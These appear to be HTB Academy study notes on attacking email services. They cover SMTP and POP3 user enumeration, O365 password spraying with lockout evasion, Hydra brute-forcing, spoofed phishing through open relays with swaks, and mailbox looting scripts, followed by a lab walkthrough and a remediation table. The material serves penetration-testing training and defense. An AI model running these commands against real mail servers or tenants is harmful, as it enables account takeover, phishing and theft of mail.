# Attacking Email Services

> HTB Academy · Attacking Common Services · Section 15 / 19

Mail infrastructure is a multi-protocol, multi-port surface (SMTP submission/relay, IMAP, POP3, plus their TLS variants) increasingly fronted by cloud tenants (M365, Google Workspace, Zoho). Two offensive lanes: **on-prem misconfigurations** (Postfix/Exchange/Dovecot — VRFY/EXPN/RCPT TO user enum, weak auth, open relay) and **cloud-tenant attacks** (`o365spray`, `MailSniper`, `CredKing`). Both end with the same primitive: a valid mailbox credential or a relay you can send phish through.

---

## Quick Reference

| Goal | Tool / Command |
|------|----------------|
| Find mail server | `dig +short MX <domain>` / `host -t MX <domain>` |
| Port sweep | `nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <ip>` |
| SMTP user enum | `smtp-user-enum -M RCPT -U users.txt -D <domain> -t <ip>` |
| Manual SMTP enum | `telnet <ip> 25` → `VRFY user` / `EXPN list` / `RCPT TO:user` |
| POP3 user enum | `telnet <ip> 110` → `USER name` |
| Open-relay check | `nmap -p25 --script smtp-open-relay <ip>` |
| Send mail (relay/phish) | `swaks --from x@y --to z@y --server <ip> --body 'msg'` |
| O365 tenant validate | `o365spray --validate --domain <domain>` |
| O365 user enum | `o365spray --enum -U users.txt --domain <domain>` |
| O365 spray | `o365spray --spray -U users.txt -p 'Pass!' --count 1 --lockout 1 --domain <domain>` |
| POP3/IMAP/SMTP brute | `hydra -L users.txt -p 'Pass!' -f <ip> pop3` |

---

## Mail Architecture in 30 Seconds

```
[Client] --SMTP submission (587/465)--> [MTA out] --SMTP relay (25)--> [MTA in] --LMTP--> [Mailbox]
                                                                                              ^
[Client] <----IMAP (143/993) / POP3 (110/995)--------------------------------------------------|
```
> SMTP is for sending, IMAP/POP3 are for receiving. Port 25 is MTA-to-MTA (relay). Port 587 is the authenticated client submission port. Attack all three depending on what's exposed.

| Port | Service | Role |
|------|---------|------|
| 25/tcp | SMTP relay (cleartext + STARTTLS) | MTA-to-MTA mail transfer |
| 465/tcp | SMTPS | SMTP submission wrapped in TLS |
| 587/tcp | SMTP submission (STARTTLS) | Authenticated client → outbound MTA |
| 110/tcp | POP3 cleartext | Pull mail (deletes from server by default) |
| 995/tcp | POP3S | POP3 wrapped in TLS |
| 143/tcp | IMAP cleartext | Pull mail (keeps on server, multi-device) |
| 993/tcp | IMAPS | IMAP wrapped in TLS |

---

## 1. Discovery — Where is the mail?

### MX records identify the responsible MTA

```bash
dig +short MX hackthebox.eu
# 1 aspmx.l.google.com.

host -t MX microsoft.com
# microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.

dig +short MX inlanefreight.com
# 10 mail1.inlanefreight.com.
host -t A mail1.inlanefreight.com
# 10.129.14.128
```
> The MX record reveals the mail provider. A Google or Microsoft answer means cloud tenants — use o365spray or CredKing. A custom hostname means on-prem — port-scan it and use protocol-based attacks.

### Reading the MX answer

| MX target pattern | Provider — adjust attack accordingly |
|-------------------|--------------------------------------|
| `*.mail.protection.outlook.com` | Microsoft 365 → use `o365spray`, `MailSniper`, `omspray`, `MSOLSpray` |
| `aspmx.l.google.com` | Google Workspace → `CredKing`, OAuth-aware tooling; SMTP/IMAP brute usually blocked |
| `*.zoho.com`, `*.protonmail.ch`, `*.fastmail.com` | Hosted SaaS — provider-specific tooling |
| Self-hosted FQDN (`mail1.victim.com`) | On-prem Postfix/Exchange/Exim — port-scan + protocol attacks below |

### Port sweep the MTA

```bash
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 10.129.14.128
# 25/tcp  open smtp Postfix smtpd
# |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
```
> Scans all 7 standard mail ports. `-sC` runs default scripts that show SMTP capabilities. The `VRFY` in the banner means user enumeration is likely possible. Replace the IP with your target.

The `-sC` banner already tells you whether `VRFY` is enabled.

---

## 2. Username Enumeration (on-prem)

### SMTP — three commands, three behaviors

| Command | Purpose | Indicator |
|---------|---------|-----------|
| `VRFY <user>` | Verify a user exists | `252` / `250` = exists, `550` = no |
| `EXPN <list>` | Expand a mailing list to its members | `250` followed by member addresses |
| `RCPT TO:<user>` | Address an in-flight message | `250` = accepted (exists), `550` = no |

#### Manual VRFY

```text
$ telnet 10.10.110.20 25
220 parrot ESMTP Postfix (Debian/GNU)
VRFY root
252 2.0.0 root
VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown
```

#### Manual EXPN — also leaks list members

```text
EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

> EXPN against a generic alias like `all`, `staff`, `support`, `it`, `sales` is high-EV — one query yields a roster.

#### Manual RCPT TO

```text
MAIL FROM:test@htb.com
250 2.1.0 test@htb.com... Sender ok
RCPT TO:julio
550 5.1.1 julio... User unknown
RCPT TO:john
250 2.1.5 john... Recipient ok
```

### POP3 USER probe

```text
$ telnet 10.10.110.20 110
+OK POP3 Server ready
USER julio
-ERR
USER john
+OK
```

`+OK`/`-ERR` directly leaks account validity if the server exposes it (Dovecot tightens this, older qpopper/uw-imap don't).

### Automate with `smtp-user-enum`

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
# Mode RCPT
# 10.129.203.7: jose@inlanefreight.htb exists
# 10.129.203.7: pedro@inlanefreight.htb exists
# 10.129.203.7: kate@inlanefreight.htb exists
```
> `-M RCPT` uses the RCPT TO method. `-U` is the username wordlist. `-D` is the domain suffix added to each username. `-t` is the target IP. Replace all three with your target's values. Use `-M VRFY` only if the banner confirms VRFY is allowed.

| Mode | When to use |
|------|-------------|
| `-M VRFY` | Banner shows `VRFY` and server returns 252/550 |
| `-M EXPN` | Banner shows `EXPN`; pair with list-name wordlist |
| `-M RCPT` | Default fallback when VRFY/EXPN are disabled — almost always works |

**Wordlists:** `seclists/Usernames/Names/names.txt`, `seclists/Usernames/cirt-default-usernames.txt`, plus role accounts (`admin`, `root`, `info`, `sales`, `noreply`, `helpdesk`).

---

## 3. Cloud Tenant Enumeration

### Validate the tenant

```bash
o365spray --validate --domain msplaintext.xyz
# [VALID] The following domain is using O365: msplaintext.xyz
```
> Always validate the tenant first. If the domain does not use O365, the enum and spray commands won't work. Replace `msplaintext.xyz` with your target domain.

Internally checks `https://login.microsoftonline.com/getuserrealm.srf?login=foo@<domain>` and the `autodiscover-s.outlook.com` DNS — no traffic to the customer.

### User enumeration via `o365spray`

```bash
o365spray --enum -U users.txt --domain msplaintext.xyz
# [VALID] lewen@msplaintext.xyz
# [VALID] juurena@msplaintext.xyz
```
> `-U` is the username wordlist. `--domain` is the target tenant domain. Valid users are printed with `[VALID]`. Replace the wordlist path and domain with your target's values.

Other working O365 enum vectors (rotate when one rate-limits):

| Tool | Endpoint |
|------|----------|
| `o365spray --enum_module office` | `office.com` login pre-flight |
| `o365spray --enum_module oauth2` | OAuth2 v2.0 endpoint |
| `o365spray --enum_module onedrive` | OneDrive personal-URL probe |
| `MSOLSpray` | `login.microsoftonline.com` (Azure AD) |
| `kerbrute` | On-prem AD user enum (Kerberos pre-auth) — useful when O365 is hybrid-joined |

### Username format hunting

Cloud tenants almost always normalize usernames. Generate candidate lists with multiple permutations from a name list:

```bash
# username-anarchy generates first.last, flast, firstl, etc.
username-anarchy -i names.txt > users.txt
```
> `-i` reads a file of names (one per line, `First Last` format). Outputs all common username permutations. Feed `users.txt` into o365spray or smtp-user-enum.

---

## 4. Password Attacks

### On-prem POP3 / IMAP / SMTP — Hydra

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
# [110][pop3] host: 10.129.42.197 login: john password: Company01!

hydra -L users.txt -p 'Spring2026!' -f 10.10.110.20 imap
hydra -L users.txt -p 'Spring2026!' -f 10.10.110.20 smtp -s 587
```
> `-L` is the user list, `-p` sprays one password across all users. `-f` stops after the first hit. `-s 587` overrides the default port for SMTP submission. Replace the IP, user list, and password with your target's values.

Hydra patterns:

| Flag | Meaning |
|------|---------|
| `-L users.txt -p 'Pass'` | **Spray** (one password, many users) — preferred to avoid lockout |
| `-l user -P passwords.txt` | Brute (one user, many passwords) — only when you're sure no lockout |
| `-f` | Stop after first hit |
| `-t 4` | Throttle parallelism (default 16 — too aggressive for hardened MTAs) |

### Cloud spray — `o365spray`

```bash
o365spray --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
# [VALID] lewen@msplaintext.xyz:March2022!
```
> `-U` is the list of valid users from enumeration. `-p` is the password to spray. `--count 1` sprays one password per cycle. `--lockout 1` waits 1 minute between cycles to avoid Azure smart lockout. Replace the password, user list, and domain with your target's values.

| Flag | Purpose |
|------|---------|
| `--count 1` | One password per spray cycle |
| `--lockout 1` | Wait 1 minute between cycles (Azure AD smart-lockout window) |
| `--spray_module oauth2` | Use OAuth2 endpoint (default) — survives most blocks |
| `--spray_module autologon` | ADFS pre-auth (works on hybrid-joined tenants) |

> **Azure AD smart lockout** typically allows ~10 attempts per IP per ~10 min before locking. Stay well under.

### Cloud spray — alternatives

| Tool | Provider |
|------|----------|
| `MailSniper.ps1` | M365 / Exchange (PowerShell, also OWA brute) |
| `omspray` | M365 (modern) |
| `MSOLSpray.ps1` | Azure AD direct |
| `CredKing` | Gmail / Okta (uses AWS Lambda for IP rotation) |
| `trevorspray` | Multi-tenant generic |

### Common password seeds

`Spring2026!`, `Summer2026!`, `Welcome1!`, `<Company>2026!`, `Password1!`, `<Month><Year>!`. Cross-reference breach corpora (HIBP, ScatteredSecrets) when client scope allows.

---

## 5. Open Relay → Spoofed Phishing

### Detect

```bash
nmap -p25 -Pn --script smtp-open-relay <ip>
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```
> Replace `<ip>` with the target SMTP server. The script tries 16 different envelope combinations. Even 1/16 is a reportable finding — it means spoofed email delivery is possible for at least some scenarios.

The script tries 16 envelope/header combinations (foreign sender, foreign recipient, `<>` MAIL FROM, source-routed addresses, etc.). Even **partial** open relays (1/16) are reportable — they often allow internal-spoofed phishing.

### Send via `swaks`

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, please complete the survey: http://phish.evil/' \
      --server 10.10.11.213
```
> `--from` sets the envelope sender (what SPF checks). `--to` is the recipient. `--header` adds mail headers. `--server` is the relay SMTP IP. Replace all values with your target's. Add `--tls` for STARTTLS and `--auth LOGIN` for authenticated submission.

`swaks` walks the SMTP conversation verbosely — perfect for screenshots in a report. Key flags:

| Flag | Use |
|------|-----|
| `--from <addr>` / `--to <addr>` | Envelope sender/recipient |
| `--h-From: "Display <addr>"` | Header `From:` (what the user sees — can differ from envelope) |
| `--server <ip>:<port>` | Target MTA |
| `--auth LOGIN --auth-user u --auth-password p` | Authenticated submission |
| `--tls` | STARTTLS |
| `--attach file` | Add attachment (payload delivery) |
| `--data data.eml` | Send a fully crafted MIME message |

### Spoofing guardrails

The relay only delivers to recipients **its** MTA serves; for cross-domain spoofing the receiving MTA enforces:

- **SPF** — does the sender IP match the sender-domain's `TXT v=spf1 ...`?
- **DKIM** — is the message signed by a key the sender domain publishes?
- **DMARC** — what's the `p=` policy when SPF/DKIM fail?

A modern Gmail/Outlook recipient will reject or quarantine bare-spoofed mail with `p=reject`. Open-relay spoofing succeeds best when:

- The target domain has no DMARC, or `p=none`.
- The relay is the **inbound** MTA itself — its own anti-spoof checks are usually weakest for its own domain.

---

## 6. Post-Compromise — what to do with creds

| Access | Next move |
|--------|-----------|
| Single mailbox creds (IMAP) | Loot `Inbox`, `Sent`, attachments — passwords, VPN configs, internal hostnames |
| Multiple mailboxes | Pivot via internal phishing (you're now sending from a trusted user) |
| O365 cred | Test for legacy auth (`Test-OAuth`/`mfasweep`); MailSniper for global address list export |
| Exchange cred | Try EWS, Outlook Anywhere, ActiveSync; check `MailSniper -ExchHostname` |
| Open relay | Phishing only — no creds yet, but a trust-rich delivery channel |

### Mailbox loot (IMAP, with creds)

```bash
# Quick TUI
mutt -f imaps://john:'Company01!'@10.10.110.20

# Programmatic dump
python3 -c "
import imaplib, email
m=imaplib.IMAP4_SSL('10.10.110.20')
m.login('john','Company01!')
m.select('INBOX')
typ,data=m.search(None,'ALL')
for n in data[0].split():
    _,msg=m.fetch(n,'(RFC822)')
    print(email.message_from_bytes(msg[0][1]))
"
```
> `mutt` opens an interactive mailbox TUI — use for quick browsing. The Python one-liner dumps all messages to stdout — use for automated loot extraction. Replace the IP, username, and password with your target's credentials.

`MailSniper` does the same against EWS for M365 / Exchange.

### Global Address List (M365)

```powershell
Invoke-GlobalO365MailboxSearch -ExchangeVersion Exchange2013 -UserName lewen@msplaintext.xyz -Password 'March2022!' -Terms 'password','vpn','secret'
```
> Part of the MailSniper PowerShell module. Searches all accessible mailboxes for the listed keywords. Replace `UserName`, `Password`, and `Terms` with your values. Requires EWS access to the Exchange server.

---

## Lab Attack Chain — Skills Assessment (`inlanefreight.htb` / hMailServer)

End-to-end walkthrough for the Section 15 lab (target `10.129.203.12`, hMailServer on Windows). Demonstrates SMTP user enumeration → POP3 password brute → mailbox flag retrieval.

### 1. Recon

```bash
nmap -Pn -sV -sC -p25,110,143,465,587,993,995 10.129.203.12
# 25/tcp   open smtp     hMailServer (banner: "WIN-02 ESMTP")
# 110/tcp  open pop3     hMailServer
# 143/tcp  open imap     hMailServer
# 587/tcp  open smtp     hMailServer
```
> Replace the IP with your target. The banner reveals the mail server software — hMailServer in this case. Use the software name to look up default credentials and known VRFY/EXPN behavior.

**Gotcha:** EHLO advertises `VRFY` in HELP output but the server returns `502 VRFY disallowed.` for every query. Ignore the banner — pivot straight to **RCPT TO** mode.

### 2. SMTP Username Enumeration (RCPT TO)

The module ships a custom `users.list` (~79 entries) under the section's **Resources** download. Standard `seclists` wordlists (top-usernames-shortlist, names.txt) **do not contain** the answer (`marlin`) — use the provided list.

```bash
# Add target to /etc/hosts so swaks/hydra can use the FQDN
echo "10.129.203.12 inlanefreight.htb" | sudo tee -a /etc/hosts

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
# 10.129.203.12: marlin@inlanefreight.htb exists
```

Server responses to disambiguate hits from misses:

| Response | Meaning |
|----------|---------|
| `250 OK` / no error after RCPT | mailbox exists & accepts mail |
| `550 Account is not active.` | account exists, disabled (still a valid hit) |
| `550 Unknown user` | mailbox does not exist |

### 3. POP3 Password Brute

```bash
hydra -l 'marlin@inlanefreight.htb' -P passwords.list -f inlanefreight.htb pop3
# [110][pop3] host: inlanefreight.htb  login: marlin@inlanefreight.htb  password: poohbear
```

**hMailServer auth quirk:** the POP3 `USER` command requires the **full email address** (`marlin@inlanefreight.htb`), not just `marlin`. Using the bare username returns `-ERR Invalid user name or password. Please use full email address as user name.`

### 4. Read Mailbox & Grab Flag

Quick scripted POP3 session (no MUA required):

```bash
{ printf 'USER marlin@inlanefreight.htb\r\n'; sleep 1; \
  printf 'PASS poohbear\r\n';                  sleep 1; \
  printf 'LIST\r\n';                            sleep 1; \
  printf 'RETR 1\r\n';                          sleep 2; \
  printf 'QUIT\r\n'; } | nc -w 15 10.129.203.12 110
```

Output (trimmed):

```
+OK Mailbox locked and ready
+OK 1 messages (601 octets)
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb

Hi admin,
How can I change my password to something more secure?

flag: HTB{w34k_p4$$w0rd}
```

### Lab Lessons

- hMailServer falsely advertises `VRFY` — always test the verb manually before wasting cycles on `smtp-user-enum -M VRFY`.
- The "right" wordlist for an HTB Academy lab is usually the section's **Resources** zip, not seclists. Download it first.
- POP3/IMAP/SMTP-AUTH on hMailServer want `user@domain`; build hydra wordlists with that suffix already attached.
- POP3 RETR is faster than spinning up Evolution/Thunderbird for a one-shot mailbox dump in a CTF.

---

## Defenses (for report's Remediation section)

| Control | Setting |
|---------|---------|
| Disable VRFY/EXPN | Postfix: `disable_vrfy_command = yes`; Sendmail: `O PrivacyOptions=goaway` |
| Generic RCPT TO error | Always reject with same string regardless of validity (Postfix `reject_unverified_recipient` with `unverified_recipient_reject_code=550` and a uniform message) |
| Disable plaintext SMTP/POP3/IMAP | Force STARTTLS or TLS-only (587/993/995); disable 25 for clients, 110/143 entirely |
| No open relay | Postfix: `smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination` |
| Strong SPF / DKIM / DMARC | `v=spf1 ... -all`; sign all outbound; `p=reject` on DMARC |
| Account lockout / smart lockout | Azure AD smart lockout on, on-prem fail2ban for SMTP/IMAP |
| MFA | Mandatory for OWA, EWS, IMAP/POP3 — disable legacy auth in M365 |
| Mail-flow logging | Centralize Postfix `maillog` / Exchange Message Trace; alert on >N RCPT TO 5xx per minute |

---

## Key Takeaways

- **MX records pick your attack tree.** Cloud → tenant tooling. Self-hosted → port-scan + protocol attacks.
- **`RCPT TO` enum is the universal fallback** when VRFY/EXPN are disabled. It's almost always available.
- **Spray, don't brute.** One password against many users beats lockouts and is the realistic engagement model.
- **Open relay = phishing without creds.** Detect with `nmap`, weaponize with `swaks`, gate on SPF/DKIM/DMARC reality.
- **O365 changes weekly.** Tools (`o365spray`, `MSOLSpray`, `MailSniper`) need version checks before each engagement.
- **Post-creds, mailboxes are credential gold mines** — search `Sent` first, password resets second.

---

## References

- HTB Academy — *Attacking Common Services*, Section 15: Attacking Email Services
- pentestmonkey — `smtp-user-enum`: <http://pentestmonkey.net/tools/smtp-user-enum>
- 0xZDH — `o365spray`: <https://github.com/0xZDH/o365spray>
- dafthack — `MailSniper`: <https://github.com/dafthack/MailSniper>, `MSOLSpray`: <https://github.com/dafthack/MSOLSpray>
- ustayready — `CredKing`: <https://github.com/ustayready/CredKing>
- jetmore — `swaks`: <https://www.jetmore.org/john/code/swaks/>
- urbanadventurer — `username-anarchy`: <https://github.com/urbanadventurer/username-anarchy>
- ropnop — `kerbrute`: <https://github.com/ropnop/kerbrute>
- RFC 5321 (SMTP), RFC 3501 (IMAP4rev1), RFC 1939 (POP3), RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
